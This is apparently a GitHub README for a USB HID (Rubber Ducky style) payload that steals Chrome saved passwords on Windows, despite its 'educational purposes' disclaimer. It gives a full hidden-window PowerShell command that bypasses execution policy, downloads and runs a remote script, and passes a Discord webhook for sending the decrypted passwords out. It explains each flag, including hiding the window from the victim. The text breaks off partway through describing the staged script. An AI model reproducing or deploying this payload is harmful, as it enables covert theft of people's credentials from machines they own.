THIS SCRIPT IS ONLY INTENDED FOR EDUCATIONAL PURPOSES
(decrypt script made by ohyicong)

# Dependencies:
- Windows
- Python

# How it Works:

(This code is very unoptimized, but i havent bothered fixing it)

## The rubber ducky script
When the grabber.dd runs it opens a powershell terminal window and enters this string:

```
powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1 ; powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>""
```

### Flags used:

The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
- ```-NonI``` Makes the user unable to interact with the script while its running
- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
- Now the script proceecds to execute a sequence of commands

### Commands ran:

1. The first command ran is ```cd $env:USERPROFILE\Documents``` which takes us into the users Documents folder where we will be doing everything
   
2. Next we run ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1``` which invokes a web request to the github link where the starter.ps1 script is and downloading it, the script is placed in the Documents folder with the -OutFile argument
  
3. Now we run ```powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>"``` as our last command. This uses the powershell interpreter to execute the starter.ps1 script and then passes the variable -webhookUrl to the powershell script. This is used for the discord webhook in the script.

## The powershell script

The powershell script is used as sort of a base of operations, it downlaods the python password decryptor and sends the file over discord. Heres how it works:

### Extracting the passwords:

To extract the passwords saved in chrome we use a python script made by ohyicong, if you are interested in how it works you can read his [medium article](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d)

First we tell powershell where python is located on the system so we can use it to execute the script:
```
$filePath = "$env:LocalAppData\Programs\Python\Python311\python.exe"
```
